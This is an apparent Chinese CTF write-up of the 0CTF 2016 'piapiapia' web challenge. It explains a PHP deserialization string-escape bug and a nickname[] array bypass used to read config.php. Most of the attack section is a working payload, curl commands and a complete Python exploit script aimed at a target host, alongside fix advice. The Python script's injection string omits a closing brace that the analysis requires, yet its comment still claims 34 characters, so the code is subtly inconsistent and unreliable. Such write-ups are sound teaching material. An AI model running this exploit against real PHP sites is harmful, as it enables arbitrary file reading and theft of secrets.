---
title: "[0CTF 2016]piapiapia"
date: 2025-05-30T15:00:00+08:00
draft: false
tags: ["CTF", "Web安全", "PHP", "反序列化", "文件读取"]
categories: ["Writeup"]
---

## 题目信息

- **类型**：Web / PHP 反序列化
- **核心漏洞**：反序列化字符串逃逸 + 任意文件读取
- **源码泄露**：`www.zip`

---

## 源码结构

下载源码后得到以下关键文件：

| 文件 | 作用 |
|------|------|
| `index.php` | 登录页面 |
| `register.php` | 注册页面 |
| `update.php` | 更新个人信息（文件上传 + 数据入库）|
| `profile.php` | 展示个人信息（触发文件读取）|
| `class.php` | 核心类（user + mysql）|
| `config.php` | 配置文件（含 flag）|

---

## 漏洞分析

### 1. 任意文件读取（核心利用点）

`profile.php` 第 16 行：

```php
$profile = unserialize($profile);
$photo = base64_encode(file_get_contents($profile['photo']));
```

`$profile` 是从数据库读取的序列化字符串，经过 `unserialize()` 后得到数组。`$profile['photo']` 作为文件路径传入 `file_get_contents()`，结果被 base64 编码输出到页面。

**如果能控制 `$profile['photo']` 的值，就能读取服务器上的任意文件。**

### 2. 反序列化字符串逃逸

#### 2.1 filter() 函数

`class.php` 中的 `filter()`：

```php
public function filter($string) {
    $escape = array('\'', '\\\\');
    $escape = '/' . implode('|', $escape) . '/';
    $string = preg_replace($escape, '_', $string);

    $safe = array('select', 'insert', 'update', 'delete', 'where');
    $safe = '/' . implode('|', $safe) . '/i';
    return preg_replace($safe, 'hacker', $string);
}
```

关键点：
- `where`（5 字符）被替换为 `hacker`（6 字符）
- **每出现一次 `where`，替换后长度 +1**
- 替换是在**整个序列化字符串**上进行的

#### 2.2 update.php 的序列化流程

```php
$profile['phone'] = $_POST['phone'];
$profile['email'] = $_POST['email'];
$profile['nickname'] = $_POST['nickname'];
$profile['photo'] = 'upload/' . md5($file['name']);

$user->update_profile($username, serialize($profile));
```

`serialize($profile)` 生成的字符串会经过 `filter()` 再存入数据库。

如果能在 `$profile` 的某个字段中注入大量 `where`，替换后序列化字符串的长度就会发生变化，导致 **声明的长度与实际长度不匹配**，从而"吞掉"后面的字段。

### 3. nickname[] 数组绕过长度限制

`update.php` 对 nickname 的限制：

```php
if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
    die('Invalid nickname');
```

正常情况下：
- 长度不能超过 10
- 只能包含字母、数字、下划线

**绕过方法：将 `nickname` 提交为数组**

发送 `nickname[]=<payload>`，PHP 会解析为 `$_POST['nickname'] = array(0 => <payload>)`。

此时：
- `preg_match('/.../', array())` → 返回 `false`，发出 Warning 但不会 die
- `strlen(array())` → 返回 `NULL`，`NULL > 10` 为 `false`

**成功绕过长度和字符限制。**

---

## 攻击流程

### 完整数据流

```
用户访问 update.php
    ↓ 提交表单（phone/email/nickname[]/photo）
update.php 构造 $profile 数组
    ↓ serialize($profile) 生成序列化字符串
filter() 替换 where → hacker（长度 +N）
    ↓ SQL UPDATE 存入数据库
用户访问 profile.php
    ↓ 从数据库读取 profile 字段
unserialize() 反序列化（因长度差解析出错，photo 被篡改）
    ↓ file_get_contents('config.php')
base64_encode() 编码文件内容
    ↓ 输出到 <img> 标签
用户提取 base64 并解码得到 flag
```

### 注入过程详解

#### 第一步：确定注入目标

目标是让 `$profile['photo']` 的值变成 `'config.php'`。

在 PHP 序列化格式中，一个字段表示为：
```
s:5:"photo";s:10:"config.php";
```

但我们需要先结束 nickname 数组，再在外层注入这个字段。所以注入内容是：
```
";}s:5:"photo";s:10:"config.php";}
```

拆解：
| 片段 | 作用 |
|------|------|
| `"` | 结束当前字符串 |
| `;` | 分隔符 |
| `}` | 结束 nickname 数组 |
| `s:5:"photo"` | 声明新字段名 "photo" |
| `;` | 分隔符 |
| `s:10:"config.php"` | 字段值 "config.php" |
| `}` | 结束外层数组 |

#### 第二步：计算 where 数量

注入内容长度 = 34。

每个 `where`（5 字符）被替换为 `hacker`（6 字符），长度 +1。

所以需要 **34 个 `where`** 来产生 34 的长度差。

#### 第三步：构造最终 payload

```
where * 34 + ";}s:5:"photo";s:10:"config.php";}
```

原始长度 = 34×5 + 34 = 204。

#### 第四步：理解替换后的序列化字符串

原始序列化（未经 filter）：
```
a:4:{s:5:"phone";s:11:"13800138000";s:5:"email";s:5:"a@b.c";s:8:"nickname";a:1:{i:0;s:204:"wherewhere...where";s:5:"photo";s:10:"config.php";}s:5:"photo";s:39:"upload/xxxxxx";}
```

经过 filter 替换后：
```
a:4:{...s:8:"nickname";a:1:{i:0;s:204:"hackerhacker...hacker";s:5:"photo";s:10:"config.php";}
s:5:"photo";s:39:"upload/xxxxxx";}
```

**关键变化**：
- `s:204` 声明长度是 204
- 实际值前 204 个字符是 34 个 `hacker`
- 后面紧跟 `";}s:5:"photo"...`

#### 第五步：PHP 反序列化时的解析过程

PHP 反序列化器从左到右扫描：

1. 读取数组 `a:4`，开始解析 4 个字段
2. 解析 `phone`、`email`，正常
3. 解析 `nickname`，发现是数组 `a:1`
4. 在 nickname 数组内，读取字符串声明 `s:204`
5. **读取 204 个字符**：正好是 34 个 `hacker`（204 字符）
6. 遇到 `";}`：字符串结束，nickname 数组结束
7. 遇到 `s:5:"photo"`：解析为外层数组的新字段
8. 遇到 `s:10:"config.php"`：`photo` 的值变成 `config.php`
9. 遇到 `}`：**外层数组结束！**
10. 后面的 `;s:5:"photo";s:39:"upload/xxxxxx";}` **被忽略**

最终解析结果：
```php
$profile = [
    'phone' => '13800138000',
    'email' => 'a@b.c',
    'nickname' => ['hackerhacker...'],  // 被吞掉的 34 个 hacker
    'photo' => 'config.php'               // ✅ 被篡改了！
];
```

#### 第六步：触发文件读取

`profile.php` 执行：
```php
$photo = base64_encode(file_get_contents($profile['photo']));
// 实际执行：
// $photo = base64_encode(file_get_contents('config.php'));
```

服务器上的 `config.php` 内容被读取并 base64 编码，输出到页面：
```html
<img src="data:image/gif;base64,PD9waHA...">
```

解码后得到：
```php
<?php
$config['hostname'] = '127.0.0.1';
...
$flag = 'DASCTF{46a944ad-dc22-4fd2-89ab-a88e758b6108}';
?>
```

---

## 利用步骤

### 1. 注册并登录

```bash
curl -X POST -d "username=hack&password=hack" http://target/register.php
curl -X POST -d "username=hack&password=hack" http://target/index.php
```

### 2. 提交 Payload

```bash
curl -X POST \
  -F "phone=13800138000" \
  -F "email=a@b.c" \
  -F "nickname[]=where...where\";}s:5:\"photo\";s:10:\"config.php\";}" \
  -F "photo=@a.jpg" \
  http://target/update.php
```

> 注意：文件需大于 5 字节（`update.php` 限制）

### 3. 读取结果

访问 `profile.php`，页面中的 `<img>` 标签的 `src` 属性包含 base64 编码的文件内容：

```html
<img src="data:image/gif;base64,PD9waHA...">
```

提取 base64 并解码即可得到文件内容。

---

## 关键代码

```python
import requests
import re
import base64

URL = "http://target"
s = requests.Session()

# 注册登录
s.post(f"{URL}/register.php", data={"username": "hack", "password": "hack"})
s.post(f"{URL}/index.php", data={"username": "hack", "password": "hack"})

# 构造 payload
inject = '";s:5:"photo";s:10:"config.php";}'
where_count = len(inject)  # 34
payload = 'where' * where_count + inject

# 提交 update
files = {'photo': ('a.jpg', b'aaaaaa', 'image/jpeg')}
data = {
    'phone': '13800138000',
    'email': 'a@b.c',
    'nickname[]': payload
}
s.post(f"{URL}/update.php", data=data, files=files)

# 获取结果
r = s.get(f"{URL}/profile.php")
m = re.search(r'data:image/gif;base64,([^"\'\s<>]+)', r.text)
if m:
    content = base64.b64decode(m.group(1))
    print(content.decode('utf-8'))
```

---

## 漏洞修复建议

1. **修复反序列化逃逸**：不要在序列化字符串上进行关键词替换，应先对输入值过滤，再序列化
2. **严格限制 nickname**：强制校验 `nickname` 为字符串，拒绝数组输入
3. **使用 PDO + 预处理语句**：防止 SQL 注入（虽然本题中 SQL 注入被过滤，但 `mysql_*` 函数已废弃）
4. **文件上传校验**：限制文件扩展名、MIME 类型，使用随机文件名
5. **移除源码泄露**：删除 `www.zip` 等打包文件

---

## 总结

本题是一道经典的 **PHP 反序列化字符串逃逸** CTF 题目。核心利用链：

1. `nickname[]` 数组绕过长度和字符限制
2. `filter()` 中 `where` → `hacker` 产生长度差
3. 长度差导致反序列化时"吞掉"后续字段
4. 注入新的 `photo` 字段控制 `file_get_contents()` 的参数
5. 读取 `config.php` 获取 flag
